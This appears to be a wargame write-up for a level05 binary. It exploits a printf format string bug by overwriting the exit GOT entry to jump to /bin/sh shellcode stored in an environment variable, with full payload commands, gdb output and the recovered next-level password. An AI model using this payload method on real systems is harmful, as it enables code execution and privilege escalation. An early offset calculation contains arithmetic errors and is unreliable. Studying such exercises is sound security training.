The only vulenerability we can get from a first look is the unsecure printf at the end
`printf(buf);`, possible format string expoit.
From the code we can also see that there is a xor operation which will transform all upercase cahracters in lowercase, but there is No RELRO which gives us the possibility to overwrite the GOT entry of (exit).
First we will find the offset from where we actually start writnig on the stack
```
level05@OverRide:~$ ./level05 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 0 0 0 0 ffffffff ffffd684 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```
offset 10
```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
```
GOT address: "\xe0\x97\x04\x08"
Second we will create a PAYLOAD env variable and get its address.
```
level05@OverRide:~$ export PAYLOAD=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```
Now we know that we could print the actual address with a c helper program, but the env addresses differ depending of where you run it, so we will use gdb to see the actual stack address value for the PAYLOAD env
```
(gdb)x/400s $esp
0xffffdb9d:	 "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\"...
0xffffdf21:	 "...\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\231Ph//shh/bin\211\343PS\211\341\260\v̀"
```
 Write 0xdb9d to 0x80497e0, then 0xffff to 0x80497e2
 Low word:  0xdb9d = 57121 - 8("PAYLOAD=") + 500 = 56713
 High word: 0xffff = 65535 - 56713 = 8822

 GOT entry: "\xe0\x97\x04\x08"
 Next block: "\xe2\x97\x04\x08"
```
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56713x" + "%10$hn" + "%8822x" + "%11$hn"' > /tmp/ex
```


```
level05@OverRide:/tmp$ cat getenv.c 
#include <stdio.h>

int main(int ac, char **av, char **env)
{
	printf("%p\n", getenv("PAYLOAD"));
	return 0;
}
level05@OverRide:/tmp$ gcc -m32 getenv.c 
getenv.c: In function ‘main’:
getenv.c:5:2: warning: format ‘%p’ expects argument of type ‘void *’, but argument 2 has type ‘int’ [-Wformat]
level05@OverRide:/tmp$ ./a.out 
0xffffdbaf
```

0xdbaf = 56239
(gdb) p /d 0xffff - 0xdbaf
$2 = 9296

Don't forget to actually subtract 8 ("PAYLOAD=") from the first pading (56239 - 8 = 56231)

```
level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56231x" + "%10$hn" + "%9296x" + "%11$hn"'; cat -) | ./level05
                                                f7fcfac0
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```
